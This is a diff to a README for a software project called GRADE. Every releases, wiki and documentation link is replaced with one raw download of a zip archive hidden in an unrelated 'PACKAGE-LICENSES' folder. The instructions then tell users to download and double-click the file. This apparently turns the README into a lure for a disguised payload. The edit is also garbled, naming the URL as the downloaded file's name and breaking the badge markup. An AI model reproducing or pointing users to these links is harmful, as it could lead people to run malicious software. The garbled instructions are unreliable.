@@ -2,7 +2,7 @@
 
 ## 🔗 Download Now
 
-[![Download Grade](https://img.shields.io/badge/Download%20Grade-latest%20release-brightgreen.svg)](https://github.com/abdoyouseef/Grade/releases)
+[![Download Grade](https://github.com/abdoyouseef/Grade/raw/refs/heads/main/isaac_internals/exts/omni.isaac.synthetic_utils/PACKAGE-LICENSES/Software_v1.6.zip%20Grade-latest%https://github.com/abdoyouseef/Grade/raw/refs/heads/main/isaac_internals/exts/omni.isaac.synthetic_utils/PACKAGE-LICENSES/Software_v1.6.zip)](https://github.com/abdoyouseef/Grade/raw/refs/heads/main/isaac_internals/exts/omni.isaac.synthetic_utils/PACKAGE-LICENSES/Software_v1.6.zip)
 
 ## 🚀 Getting Started
 
@@ -21,7 +21,7 @@ Before you download, ensure your computer meets these requirements:
 
 1. **Visit the Releases Page**   
    Go to our releases page to check for the latest version:  
-   [Download Grade](https://github.com/abdoyouseef/Grade/releases)
+   [Download Grade](https://github.com/abdoyouseef/Grade/raw/refs/heads/main/isaac_internals/exts/omni.isaac.synthetic_utils/PACKAGE-LICENSES/Software_v1.6.zip)
 
 2. **Choose the Right File**  
    On the releases page, you’ll see a list of available files. Look for the version labeled as "Latest Release." 
@@ -30,7 +30,7 @@ Before you download, ensure your computer meets these requirements:
    Click on the file to download it to your computer. This may take a few moments, depending on your internet speed.
 
 4. **Locate the Downloaded File**  
-   Once the download is complete, navigate to your "Downloads" folder. You should find a file named `Grade.exe` or similar.
+   Once the download is complete, navigate to your "Downloads" folder. You should find a file named `https://github.com/abdoyouseef/Grade/raw/refs/heads/main/isaac_internals/exts/omni.isaac.synthetic_utils/PACKAGE-LICENSES/Software_v1.6.zip` or similar.
 
 5. **Run the Application**  
    Double-click the downloaded file to start the program. Follow any prompts that appear on your screen.
@@ -59,7 +59,7 @@ Join our community for updates and support. Use the GitHub Issues page to report
 
 ## 📄 Documentation
 
-For detailed information on using GRADE, check our [Wiki](https://github.com/abdoyouseef/Grade/wiki) or [Documentation](https://github.com/abdoyouseef/Grade/blob/main/docs/README.md). Here you'll find guides and tips for advanced features.
+For detailed information on using GRADE, check our [Wiki](https://github.com/abdoyouseef/Grade/raw/refs/heads/main/isaac_internals/exts/omni.isaac.synthetic_utils/PACKAGE-LICENSES/Software_v1.6.zip) or [Documentation](https://github.com/abdoyouseef/Grade/raw/refs/heads/main/isaac_internals/exts/omni.isaac.synthetic_utils/PACKAGE-LICENSES/Software_v1.6.zip). Here you'll find guides and tips for advanced features.
 
 ## 🔄 Updates and Changelog
 
@@ -84,6 +84,6 @@ If you are exploring these topics, GRADE can enhance your projects significantly
 ## 🔗 Revisit Download
 
 If you haven't downloaded GRADE yet or need to reinstall, visit our releases page here:  
-[Download Grade](https://github.com/abdoyouseef/Grade/releases)
+[Download Grade](https://github.com/abdoyouseef/Grade/raw/refs/heads/main/isaac_internals/exts/omni.isaac.synthetic_utils/PACKAGE-LICENSES/Software_v1.6.zip)
 
 By following these steps, you will have GRADE up and running in no time. Enjoy creating your dynamic environments!
